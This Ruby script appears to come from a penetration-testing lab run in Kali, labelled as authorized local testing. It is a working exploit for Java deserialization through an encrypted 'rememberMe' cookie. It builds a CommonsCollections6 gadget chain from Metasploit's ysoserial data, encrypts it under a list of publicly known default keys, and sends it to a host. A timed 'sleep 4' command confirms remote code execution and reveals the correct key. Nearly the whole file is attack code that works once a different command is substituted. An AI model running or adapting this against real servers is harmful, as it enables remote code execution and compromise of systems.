#!/usr/bin/env ruby
# loop3 t7 C1 — 决定性密钥验证：对候选密钥逐个用 timing oracle（sleep 4）判定
# 全部在 Kali 内完成，HTTP 直连宿主 10.0.2.2:18081（已实测可达 302）
require 'openssl'
require 'base64'
require 'json'
require 'net/http'
require 'uri'
require 'digest'

JSON_PATH = '/usr/share/metasploit-framework/data/ysoserial_payloads.json'
TARGET = URI('http://10.0.2.2:18081/')
SLEEP_N = 4

def build(chain, cmd)
  payloads = JSON.parse(File.read(JSON_PATH, mode: 'rb'))['bash']
  p = payloads[chain]
  raise "chain #{chain} missing" unless p
  bytes = Base64.decode64(p['bytes']).dup
  bo = p['bufferOffset'].first
  bytes[bo - 1] = bytes[bo - 1] + cmd
  p['lengthOffset'].each do |lo|
    len = bytes[(lo - 1)..lo].unpack1('n')
    len += cmd.length.ord
    bytes[(lo - 1)..lo] = [len].pack('n')
  end
  bytes = bytes.gsub('ysoserial/Pwner00000000000000', 'A' * 29).gsub('ysoserial', 'B' * 9)
  bytes
end

def encrypt(plain, key_b64)
  c = OpenSSL::Cipher.new('aes-128-cbc')
  c.encrypt
  c.key = Base64.decode64(key_b64)
  iv = c.random_iv
  Base64.strict_encode64(iv + c.update(plain) + c.final)
end

def send_cookie(ck)
  req = Net::HTTP::Get.new(TARGET)
  req['User-Agent'] = 'loop3-t7/1.0 (authorized local lab)'
  req['Cookie'] = "rememberMe=#{ck}"
  t0 = Process.clock_gettime(Process::CLOCK_MONOTONIC)
  res = Net::HTTP.start(TARGET.host, TARGET.port, read_timeout: 40, open_timeout: 10) { |h| h.request(req) }
  dt = Process.clock_gettime(Process::CLOCK_MONOTONIC) - t0
  [dt, res['Set-Cookie'].to_s]
end

plain = build('CommonsCollections6', "sleep #{SLEEP_N}")
puts "PLAIN_LEN=#{plain.length} SHA256=#{Digest::SHA256.hexdigest(plain)}"

KEYS = %w[
  kPH+bIxk5D2deZiIxcaaaA==
  2AvVhdsgUs0FSA3SDFAdag==
  3AvVhmFLUs0KTA3Kprsdag==
  4AvVhmFLUs0KTA3Kprsdag==
  5AvVhmFLUs0KTA3Kprsdag==
  6AvVhmFLUs0KTA3Kprsdag==
  Z3VucwAAAAAAAAAAAAAAAA==
  wGiHplamyXlVB11UXWol8g==
  fCq+/xW488hMTCD+cmJ3aQ==
  1QWLxg+NYmxraMoxAXu/Iw==
  ZUdsaGJuSmxibVI2ZHc9PQ==
  L7RioUULEFhRyxM7a2R/Yg==
  a2VlcE9uR29pbmdBbmRGaQ==
  WcfHGU25gNnTxTlmJMeSpw==
  bWljcm9zAAAAAAAAAAAAAA==
  bWluZS1hc3NvY2lhdGlvbg==
  5aaC5qKm5oqA5pyvAAAAAA==
  6ZmI6I2j5Y+R5aSn5ZOlAA==
  r0e3c16IdVkouZgk1TKVMg==
  MTIzNDU2Nzg5MGFiY2RlZg==
  U3ByaW5nQmxhZGUAAAAAAA==
  c2hpcm9kZW1vAAAAAAAAAA==
  c2hpcm8AAAAAAAAAAAAAAA==
  YWJjZGVmZ2hpamtsbW5vcA==
  0AvVhmFLUs0KTA3Kprsdag==
  xvVhmFLUs0KTA3Kprsdag==
  kPH+bIxk5D2deZiIxcaaaA==
]

results = []
KEYS.uniq.each_with_index do |k, i|
  next unless Base64.decode64(k).bytesize == 16
  ck = encrypt(plain, k)
  dt, sc = send_cookie(ck)
  hit = dt > (SLEEP_N * 0.6)
  deleteMe = sc.include?('rememberMe=deleteMe')
  results << { key: k, elapsed: dt.round(3), executed: hit, deleteMe: deleteMe }
  puts format('[%2d] %-28s elapsed=%6.3fs executed=%-5s deleteMe=%s', i, k[0, 26], dt, hit, deleteMe)
  sleep 1.0
  break if hit
end

File.write('/tmp/t7-c1-bruteforce.json', JSON.generate(results))
puts "EXECUTED_KEYS=#{results.select { |r| r[:executed] }.map { |r| r[:key] }.inspect}"
puts "TRIED=#{results.length}"
